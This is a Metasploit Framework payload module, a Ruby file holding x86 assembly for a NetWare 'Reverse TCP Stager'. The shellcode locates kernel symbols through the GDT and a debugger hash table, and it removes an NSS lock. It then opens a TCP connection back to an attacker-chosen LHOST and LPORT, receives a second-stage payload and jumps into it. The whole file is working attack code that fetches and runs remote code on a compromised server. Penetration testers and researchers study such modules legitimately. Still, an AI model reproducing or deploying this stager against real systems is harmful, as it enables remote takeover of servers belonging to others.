##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'metasm'
require 'msf/core'
require 'msf/core/handler/reverse_tcp'


module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Netware

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse TCP Stager',
			'Description'   => 'Connect back to the attacker',
			'Author'        => 'toto',
			'License'       => MSF_LICENSE,
			'Platform'      => 'netware',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Convention'    => 'sockesi',
			'Stager'        =>
				{
					'Offsets' =>
						{
							'LHOST' => [ 0, 'ADDR' ],
							'LPORT' => [ 0, 'n'    ],
						},
					'Assembly' => <<EOS
jmp main_code

//
// resolve a symbol address using the DebuggerSymbolHashTable
// (could resolve only against function name for smaller code)
//

resolv_addr:
	push edi
	push ecx
	xor edi, edi
r_loop:
	mov edx, [ebp+edi*4]
	test edx, edx
	jz  r_next
r_loop2:
	xor esi, esi
	mov ebx, [edx+8]
	mov al, byte ptr[ebx]
r_iloop2:
	test al, al
	jz r_after2
	inc ebx
	movzx ecx, byte ptr[ebx]
	ror esi, 0x0d
	add esi, ecx
	dec al
	jmp r_iloop2
r_after2:
	cmp esi, [esp+0x0c]
	jz r_found
	mov edx, [edx]
	test edx, edx
	jnz r_loop2
r_next:
	inc edi
	cmp edi, 0x200
	jnz r_loop
	jmp r_end
r_found:
	mov eax, [edx+4]
r_end:
	pop ecx
	pop edi
	ret


main_code:
	// search DebuggerSymbolHashTable pointer using GDT system call gate
	// -> points inside SERVER.NLM
	cli
	sub esp, 8
	mov ecx, esp
	sgdt [ecx]

	cli
	mov ebx, [ecx+2]

	mov bp, word ptr [ebx+0x4E]
	shl ebp, 16
	mov bp, word ptr [ebx+0x48]

f_finddebugger:
	cmp dword ptr[ebp], 0
	jnz f_next
	cmp dword ptr[ebp+4], 0x808bc201
	jz f_end
f_next:
	dec ebp
	jmp f_finddebugger
f_end:
	mov ebp, [ebp-7]

	// resolve function pointers
	call current
current:
	pop edi
	add edi, (fct_ptrs - current)
	mov cl, 6
resolv_ptrs:
	push [edi]
	call resolv_addr
	stosd
	dec cl
	test cl, cl
	jnz resolv_ptrs

	sti

	// remove CIFS lock
	call [edi-4]          // NSS.NLM|NSSMPK_UnlockNss

	// allocate heap buffer to remove the code from the stack (if on the stack)
	// network functions will give back control to the kernel and we don't want
	// the driver to erase our shellcode

	push 65535
	call [edi-8]          ; AFPTCP.NLM|LB_malloc
	mov ecx, (end_reverse - reverse_connect)
	mov esi, edi
	sub esi, ecx
	mov edi, eax
	test eax, eax
	jz end

	repe movsb
	jmp eax


reverse_connect:
	xor ebx, ebx

	push ebp
	mov ebp, esp
	push ebp
	push ebx        // protocol
	push 1          // SOCK_STREAM
	push 2          // AF_INET
	call [edi-0xc]       // LIBC.NLM|bsd_socket_mp
	mov esi, eax
	test eax, eax
	jz end

	push ebx
	push ebx
	push LHOST
	push.i16 LPORT
	push.i16 2
	mov ecx, esp
	push ebp
	push 16
	push ecx
	push esi
	call [edi-0x10]       // LIBC.NLM|bsd_connect_mp
	cmp eax, -1
	jz end

	push 65535
	push edi
	mov ecx, esp

	push ebx
	push ebx
	push ebx
	inc ebx
	push ebx
	dec ebx
	push ecx
	push ebx
	push ebx
	mov ecx, esp

	push ebp
	push ebx
	push ecx
	push esi
	call [edi-0x14]       // LIBC.NLM|bsd_recvmsg_mp

	jmp edi

end:
	; go back to the main kernel loop
	call [edi-0x18]       // SERVER.NLM|kWorkerThread

fct_ptrs:
	dd 0x9294bdcb         // SERVER.NLM|kWorkerThread
	dd 0x3605cc1c         // LIBC.NLM|bsd_recvmsg_mp
	dd 0x19a75280         // LIBC.NLM|bsd_connect_mp
	dd 0x46f23d88         // LIBC.NLM|bsd_socket_mp
	dd 0x6877687c         // AFPTCP.NLM|LB_malloc
	dd 0x8967f0ce         // NSS.NLM|NSSMPK_UnlockNss
end_reverse:
	nop
EOS
				}
			))
	end

end
